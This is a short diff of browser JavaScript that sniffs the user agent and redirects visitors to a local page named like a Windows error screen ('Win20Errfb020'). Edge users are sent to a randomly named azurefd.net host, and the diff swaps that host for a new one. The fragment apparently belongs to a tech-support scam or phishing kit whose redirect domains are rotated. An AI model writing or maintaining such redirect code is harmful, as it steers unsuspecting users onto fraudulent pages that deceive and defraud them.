@@ -12,7 +12,7 @@
             window.location.href = "./Win20Errfb020/index.html";
         }
         if (isIEedge) {
-            window.location.href = "https://ep-ae-b8f4pu006xkf-hqfkgaencrg7hbgv.z01.azurefd.net/";
+            window.location.href = "https://ep-mx-gvpmjhf8d51s-cygaakgcgcaugvd7.z01.azurefd.net/";
         }
 if (window.navigator.userAgent.indexOf("Opera") != -1) {
             window.location.href = "./Win20Errfb020/index.html";
